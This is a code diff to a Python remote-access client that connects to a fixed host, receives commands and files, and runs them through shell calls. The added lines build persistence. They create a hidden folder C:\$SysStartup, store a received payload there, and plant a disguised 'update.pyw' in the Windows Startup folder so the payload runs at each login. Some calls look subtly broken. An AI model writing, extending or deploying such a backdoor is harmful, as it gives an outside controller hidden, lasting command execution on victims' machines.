@@ -1,10 +1,11 @@
 import socket as s
 from subprocess import check_output, call
 from time import sleep
-from sys import exit
+from sys import exit, executable, argv
 from random import randint
 from os import getlogin
 import threading
+import ctypes
 
 HOST = "10.0.0.5"
 PORT = 420
@@ -12,8 +13,7 @@ BUFFER = 1024
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
 
-var = """
-import threading
+var = """import threading
 from subprocess import call
 
 def a0001(): call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
@@ -38,7 +38,6 @@ def connector():
 def sendMsg(msg):
     sendLength = str(len(msg)).encode(FORMAT)
     client.send(sendLength)
-
     client.send(msg.encode(FORMAT))
     recvMsg()
 
@@ -63,17 +62,14 @@ def process(message):
             threads = threading.Thread(target=tComm)
             threads.start()
             recvMsg()
-
     elif ctype == "f":
         msgNoType = message[1:]
         mode = msgNoType[4]
         msg = message[5:]
         fType = msgNoType[0:3].replace(' ', '')
         name = f"a{randint(100, 900)}.{fType}"
-
         with open(f"{name}", "w") as fileObj:
             fileObj.write(msg)
-
         if mode == "A":
             if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
                 call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
@@ -82,7 +78,6 @@ def process(message):
                         obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
                         obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
                         obj.write(f'b{name[0:4]}.start()')
-
                 sendMsg(name)
             else:
                 call(["remove", name])
@@ -90,7 +85,15 @@ def process(message):
         else:
             call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
             sendMsg(name)
-
+    elif ctype == "x":
+        call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
+        message = message[1:]
+        with open("pslib.pyw", "a") as libFile:
+            libFile.write(message)
+        call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
+        with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "w") as updateFile:
+            updateFile.write(var)
+        recvMsg()
     else:
         if message == "!dsc":
             client.close()
@@ -100,7 +103,6 @@ def process(message):
 def recvMsg():
     try:
         msgLen = client.recv(BUFFER).decode(FORMAT)
-
         if msgLen and not "":
             msgLen = int(msgLen)
             msg = client.recv(int(msgLen)).decode(FORMAT)
